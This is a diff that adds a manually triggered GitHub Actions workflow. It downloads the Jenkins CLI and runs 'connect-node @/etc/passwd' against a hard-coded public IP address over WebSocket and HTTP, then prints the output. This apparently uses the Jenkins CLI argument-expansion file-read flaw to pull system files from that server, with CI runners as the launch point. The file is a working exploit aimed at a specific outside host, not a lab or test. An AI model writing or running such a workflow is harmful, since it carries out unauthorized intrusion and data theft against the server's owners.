@@ -1,0 +1,19 @@
+name: jenkinscli
+
+on:
+  workflow_dispatch:
+
+jobs:
+  cli:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: cli
+        run: |
+          java -version
+          curl -sSL -o cli.jar https://repo.jenkins-ci.org/releases/org/jenkins-ci/main/cli/2.426.1/cli-2.426.1.jar
+          ls -l cli.jar
+          echo "--- websocket ---"
+          timeout 40 java -jar cli.jar -s http://83.243.121.182:8080/ -webSocket connect-node @/etc/passwd 2>&1 | head -20 || true
+          echo "--- http ---"
+          timeout 40 java -jar cli.jar -s http://83.243.121.182:8080/ -http connect-node @/etc/passwd 2>&1 | head -20 || true
